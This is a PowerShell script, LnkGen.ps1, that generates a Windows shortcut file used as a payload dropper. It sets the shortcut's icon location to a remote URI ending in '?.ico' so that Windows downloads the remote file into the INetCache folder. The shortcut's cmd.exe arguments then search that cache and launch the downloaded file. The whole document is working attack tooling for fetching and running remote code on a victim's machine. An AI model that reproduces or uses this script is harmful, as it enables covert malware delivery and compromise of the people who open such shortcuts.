param(
    [string]$output = "",
    [string]$uri = ""
)

if ($output.Length -eq 0 -or $uri.Length -eq 0) {
    Write-Host "Usage: LnkGen.ps1 -output <location> -uri <uri>"
    Write-Host "  -output    Specifies the location to save the shortcut."
    Write-Host "  -uri       Specifies the URI to download the file from."
    exit

}

# Parse the filename 
function Get-FilenameFromUrl {
    param (
        [string]$url
    )

    # Use Split-Path to get the filename with extension
    $filename = Split-Path -Path $url -Leaf

    # Get the base filename without extension
    $baseName = [System.IO.Path]::GetFileNameWithoutExtension($filename)

    # Get the file extension
    $extension = [System.IO.Path]::GetExtension($filename)

    # Construct the new filename with [1]
    $newFilename = "$baseName[1]$extension"


    return $newFilename
}

#extract the filename and convert to filename[1].extension.
$file_convert = (Get-FilenameFromUrl -url $uri)

$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($output)
# Need to append .ico to make it download from remote
$download_ico = ($uri + "?.ico")
$shortcut.IconLocation = $download_ico

$shortcut.TargetPath = "C:\Windows\System32\cmd.exe"

$shortcut.Arguments = '/c "timeout /nobreak /t 2 > nul && for /r "%localappdata%\Microsoft\Windows\INetCache\IE" %I in (' + $file_convert + ') do @if exist "%I" start "" "%I""'
$shortcut.Save()
